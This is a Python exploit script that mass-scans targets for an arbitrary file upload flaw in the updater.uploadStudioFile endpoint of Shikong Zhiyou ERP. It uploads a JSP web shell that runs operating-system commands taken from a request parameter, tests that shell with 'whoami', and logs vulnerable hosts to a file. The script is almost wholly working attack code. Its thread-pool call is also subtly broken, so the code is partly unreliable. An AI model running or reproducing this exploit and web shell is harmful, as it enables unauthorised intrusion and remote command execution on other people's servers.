import argparse,sys,requests
from multiprocessing.dummy import Pool
#忽略警告
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m' #输出颜色
RESET = '\033[0m'

def banner():
    banner = """
 ██▓    ▄▄▄       ███▄ ▄███▓    ██ ▄█▀ ██▓ ███▄    █   ▄████ 
▓██▒   ▒████▄    ▓██▒▀█▀ ██▒    ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██▒   ▒██  ▀█▄  ▓██    ▓██░   ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
░██░   ░██▄▄▄▄██ ▒██    ▒██    ▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓
░██░    ▓█   ▓██▒▒██▒   ░██▒   ▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒
░▓      ▒▒   ▓▒█░░ ▒░   ░  ░   ▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
 ▒ ░     ▒   ▒▒ ░░  ░      ░   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
 ▒ ░     ░   ▒   ░      ░      ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
 ░           ░  ░       ░      ░  ░    ░           ░       ░ 
                                        info:C时空智友ERP updater.uploadStudioFile接口处存在任意文件上传漏洞  
                                        version:1.0 author:YeahSir               
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='时空智友ERP updater.uploadStudioFile接口处存在任意文件上传漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file file.txt.path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
        poc3(args.url)  
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                i = i.strip().replace('\n','')
                if 'https://' in i: #给资产自动添加http://
                    url_list.append(i)
                else:
                    i = 'http://' + i
                    url_list.append(i)
        mp = Pool(100)
        mp.map(poc,poc2,poc3, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload_url = "/formservice?service=updater.uploadStudioFile"
    url = target + payload_url
    header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36", 
            "Content-Type": "application/x-www-form-urlencoded", 
            "Accept-Encoding": "gzip", 
            "Connection": "close"
            }

    data =  {"content": "<?xml version=\"1.0\"?><root><filename>ceshi.jsp</filename><filepath>./</filepath><filesize>172</filesize><lmtime>1970-01-01 08:00:00</lmtime></root><!--<% out.println(\"Hello World!\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>-->\r\n\r\n"}
    try:
        res1 = requests.get(url=target,verify=False)
        res2 = requests.post(url=url, headers=header,data=data,verify=False)
        if res1.status_code == 200:
            if res2.status_code == 200 and "ceshi.jsp" in res2.text:
                print(f'{GREEN}[+] 该url{target}存在文件上传漏洞{RESET}')
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
            else:
                print(f'[-] 该站点{target}不存在文件上传漏洞')
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")

def poc2(target):
    payload_url2 = "/formservice?service=updater.uploadStudioFile"
    url2 = target + payload_url2
    header2 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36", 
            "Content-Type": "application/x-www-form-urlencoded", 
            "Accept-Encoding": "gzip", 
            "Connection": "close"
        }

    data2 =  {"content": "<?xml version=\"1.0\"?><root><filename>ceshi.jsp</filename><filepath>./</filepath><filesize>172</filesize><lmtime>1970-01-01 08:00:00</lmtime></root><!--<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"c\")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print(\"<pre>\");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print(\"</pre>\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>-->\r\n\r\n"}
    try:
        res1 = requests.get(url=target,verify=False)
        res3 = requests.post(url=url2, headers=header2,data=data2,verify=False)
        if res1.status_code == 200:
            if res3.status_code == 200 and "ceshi.jsp" in res3.text:
                print(f'{GREEN}[+] 该url{target}存在文件上传漏洞{RESET}')
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
            else:
                print(f'[-] 该站点{target}不存在文件上传漏洞')
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")


def poc3(target):
    payload_urls = "/update/temp/studio/ceshi.jsp"
    urls = target + payload_urls
    header3 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36", 
            "Content-Type": "application/x-www-form-urlencoded", 
            "Accept-Encoding": "gzip", 
            "Connection": "close"
            }

    data3 =  {"c": "whoami\r\n\r\n"}
    try:
        res5 = requests.post(url=urls, headers=header3,data=data3,verify=False)  
        if 'ceshi.jsp' in res5.text :
            print(f'{GREEN}[+] 该url{target}可以进行命令执行{RESET}')
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
        else:
            print(f'[-] 该站点{target}不可以进行命令执行')
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")


if __name__ == '__main__':
    main()